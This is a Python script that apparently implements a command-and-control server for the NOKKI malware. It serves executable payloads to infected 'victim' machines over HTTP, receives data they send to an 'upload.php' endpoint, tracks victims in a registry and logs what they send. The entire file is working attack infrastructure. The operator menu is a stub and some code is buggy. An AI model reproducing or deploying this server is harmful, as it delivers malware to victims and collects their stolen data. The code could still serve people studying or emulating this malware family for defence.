#!/usr/bin/env python
# -*- coding: utf-8 -*-

import http.server
import socketserver
import os.path
from base64 import b64decode, b64encode
import threading
import logging


victim_list = {}

class NOKKIvictim:
    # type = '[null]'  # request type: parse either 'file' or 'log': default to '[null]'
    # subject
    # time
    # date
    # data

    count_post = 0
    count_get = 0

    def __init__(self, content_body):
        # does the parsing and variable assignment
        type_flag = 0  # flag used if req_type tag exists, adds one to make room for req_type

        # parse the data from the content body
        self.subject = content_body.split('&')[0][8:].split('-')[0]
        if len(content_body.split('&')[0][8:].split('-')) > 3:
            self.type = content_body.split('&')[0][8:].split('-')[1]
            type_flag = 1
        else:
            self.type = '[null]'
        self.time = content_body.split('&')[0][8:].split('-')[1 + type_flag]
        self.date = content_body.split('&')[0][8:].split('-')[2 + type_flag]
        self.data = content_body.split('&')[1][5:]

        self.req_count = 0

    def inc_post_count(self):
        self.req_count += 1

    def inc_get_count(self):
        self.req_count += 1


class RequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        req_path = self.path
        logging.info(self.command + ": " + req_path)
        content_length = self.headers.get('Content-Length')

        filename = ''

        if type(content_length) == str:  # parsing Content-Length value if exists
            if int(content_length) > 0:
                raise Exception('Received Content-Length on GET request.')
                # TODO: specify exception; used for debugging currently

        if req_path.endswith("/down"):  # Generic Upload to Request
            # response written to weewyesqsf4.exe on victim
            filename = 'generic_file.exe'
            logging.info('Generic Upload Request')

        elif req_path.endswith("-down"):  # Specific Upload to Request
            # response written to wirbiry2jsq3454.exe on victim
            victim_id = req_path.split('-down')[0][-10:]

            victim = victim_list.get(victim_id)
            if victim:
                victim.inc_get_count()  # adds one to the request count of the victim

            logging.info("victim_id: " + victim_id)
            filename = victim_id + '_file.exe'
            logging.info('Specific Upload Request')

        else:
            raise Exception()  # catchall else for debugging

        if os.path.exists(filename):
            response_data = open(filename, 'rb').read()
        else:
            response_data = b'\x00'

        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.send_header("Content-Length", len(response_data))
        self.end_headers()
        self.wfile.write(response_data)
        return

    def do_POST(self):
        req_path = self.path
        logging.info(self.command + ": " + req_path)
        content_length = self.headers.get('Content-Length')

        req_body = str(self.rfile.read(int(content_length)), 'utf-8')

        if req_path.endswith('upload.php'):
            vic = NOKKIvictim(req_body)  # parse the data from the content body

            if not victim_list.get(vic.subject):  # check if already exists
                victim_list[vic.subject] = vic  # add victim to the victim to dict list

            victim_list[vic.subject].inc_post_count()  # adds one to the request count of the victim

            logging.info("Subject (%d): %s\n"
                  "Type: %s\n"
                  "Time/Date: %s %s\n"
                  "Data:\n%s" % (vic.req_count, vic.subject, vic.type, vic.time, vic.date, vic.data))
        else:
            raise Exception()  # TODO: specify exception after testing: used for debugging currently

        response_data = b''  # not required, the victim does not read response after POST request
        self.send_response(200)
        self.send_header("Content-req_type", "text/html")
        self.send_header("Content-Length", len(response_data))
        self.end_headers()
        self.wfile.write(response_data)
        return


def start_request_handler():
    try:
        httpd = socketserver.TCPServer(("0.0.0.0", 80), RequestHandler)
        httpd.serve_forever()
    except OSError:
        logging.error('Failed to start TCPSever RequestHandler')


def main_menu():
    menu_active = True
    menu_option = 0
    while menu_active:
        try:
            menu_option = int(input(':'))
        except Exception(''):  # TODO: specify exception
            break

        if menu_option == 0:  # LIST VICTIMS
            pass
        elif menu_option == 1:
            pass
        else:
            print('Please provide another menu input.')


def main():
    # start logging to file, allows users to tail log
    logging.basicConfig(filename='nokki.log', level=logging.INFO)

    # start request handler thread, allows for both user and victim interface
    x = threading.Thread(target=start_request_handler, args=())
    x.start()

    main_menu()
    exit()


if __name__ == '__main__':
    main()
